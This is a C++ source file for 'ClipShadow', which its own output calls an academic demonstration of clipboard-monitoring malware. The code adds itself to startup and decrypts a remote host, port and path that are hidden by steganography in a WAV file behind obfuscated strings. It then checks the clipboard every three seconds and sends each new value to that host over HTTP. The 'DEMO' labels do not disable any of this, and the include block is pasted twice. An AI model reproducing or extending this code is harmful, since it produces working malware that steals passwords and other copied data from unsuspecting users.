#include <iostream>
#include <windows.h>
#include <string>
#include <thread>

#include <clipboard.h>
#include <tools.h>
#include <httpexfil.h>
#include <wavcrypt.h>
#include <obfstr.h>

#include <iostream>
#include <windows.h>
#include <string>
#include <thread>
#include <chrono>
#include <iomanip>
#include <algorithm>

#include <clipboard.h>
#include <tools.h>
#include <httpexfil.h>
#include <wavcrypt.h>
#include <obfstr.h>

void HandleNewData(std::string& data, std::string& host, std::string& path, int port)
{    
    std::cout << "\n[DEMO] === CLIPBOARD INTERCEPTION ===" << std::endl;
    std::cout << "[DEMO] Intercepted text (" << data.length() << " chars): \"";
    
    // Show first 50 characters for demo
    size_t previewLen = std::min((size_t)50, data.length());
    std::string preview = data.substr(0, previewLen);
    std::cout << preview;
    if (data.length() > 50) std::cout << "...";
    std::cout << "\"" << std::endl;
    
    try
    {
        std::cout << "[DEMO] Exfiltrating to " << host << ":" << port << path << "... ";
        bool success = ExfiltrateClipboardHTTP(data, host, path, port);
        std::cout << (success ? "SUCCESS" : "FAILED") << std::endl;
    }
    catch(const std::exception& ex)
    {
        std::cout << "FAILED: " << ex.what() << std::endl;
    }
    catch(...)
    {
        std::cout << "FAILED: Unknown error" << std::endl;
    }
}

int main() {
    std::cout << "\n=== ClipShadow Academic Demonstration ===" << std::endl;
    std::cout << "[DEMO] Advanced clipboard monitoring malware simulation" << std::endl;
    std::cout << "[DEMO] Featuring steganography, AES-256 encryption, and HTTP exfiltration\n" << std::endl;
    
    AddToStartup();

    std::string lastClipboard = "";

    std::cout << "[DEMO] === CONFIGURATION EXTRACTION ===" << std::endl;
    std::cout << "[DEMO] Loading steganographic configuration from 'ouch.wav'..." << std::endl;
    
    auto [host, port_string, path] = ExtractAndDecryptConfig(OBFSTR("ouch.wav"));
    int port = std::stoi(port_string);
    
    std::cout << "\n[DEMO] === FINAL CONFIGURATION ===" << std::endl;
    std::cout << "[DEMO] Target Host: " << host << std::endl;
    std::cout << "[DEMO] Target Port: " << port << std::endl;
    std::cout << "[DEMO] Target Path: " << path << std::endl;
    std::cout << "\n[DEMO] === CLIPBOARD MONITORING ACTIVE ===" << std::endl;
    std::cout << "[DEMO] Monitoring clipboard every 3 seconds..." << std::endl;
    std::cout << "[DEMO] Copy some text to see real-time exfiltration!\n" << std::endl;

    while(true)
    {
        std::string currentClipboard = GetClipboardText();

        if(!currentClipboard.empty() && currentClipboard != lastClipboard) 
        {
            HandleNewData(currentClipboard, host, path, port);  
            lastClipboard = currentClipboard;
        }

        std::this_thread::sleep_for(std::chrono::seconds(3));
    }

    return 0;
}
